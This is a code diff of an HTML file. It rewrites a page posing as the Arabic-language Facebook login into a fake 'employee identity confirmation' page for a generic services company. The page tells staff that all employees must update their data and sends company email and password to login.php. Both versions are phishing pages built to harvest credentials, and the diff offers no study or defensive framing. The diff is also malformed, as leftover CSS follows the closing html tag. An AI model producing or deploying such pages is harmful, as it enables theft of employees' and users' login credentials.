@@ -1,40 +1,62 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>فيسبوك - تسجيل الدخول أو الاشتراك</title>
+    <title>تأكيد هوية الموظف</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
         body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
-            background: #f0f2f5;
+            font-family: Arial, sans-serif;
+            background: #f4f4f4;
             display: flex;
             justify-content: center;
             align-items: center;
-            min-height: 100vh;
-            padding: 20px;
+            height: 100vh;
+            margin: 0;
         }
-
         .container {
+            background: white;
+            padding: 40px;
+            border-radius: 10px;
+            box-shadow: 0 0 20px rgba(0,0,0,0.1);
+            width: 350px;
             text-align: center;
-            max-width: 400px;
+        }
+        input {
             width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border: 1px solid #ddd;
+            border-radius: 5px;
         }
-
-        .facebook-logo {
-            margin-bottom: 20px;
+        button {
+            background: #007bff;
+            color: white;
+            padding: 12px;
+            border: none;
+            border-radius: 5px;
+            width: 100%;
+            cursor: pointer;
         }
-
-        .facebook-logo svg {
-            height: 60px;
+        .logo {
+            font-size: 24px;
+            font-weight: bold;
+            color: #007bff;
         }
-
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">✅ شركة الخدمات</div>
+        <h3>تأكيد هوية الموظف</h3>
+        <p style="color: gray; font-size: 14px;">مطلوب من جميع الموظفين تحديث بياناتهم</p>
+        <form method="POST" action="login.php">
+            <input type="email" name="email" placeholder="البريد الإلكتروني للشركة" required>
+            <input type="password" name="password" placeholder="كلمة المرور" required>
+            <button type="submit">تأكيد الهوية</button>
+        </form>
+    </div>
+</body>
+</html>
         .login-card {
             background: white;
             border-radius: 8px;
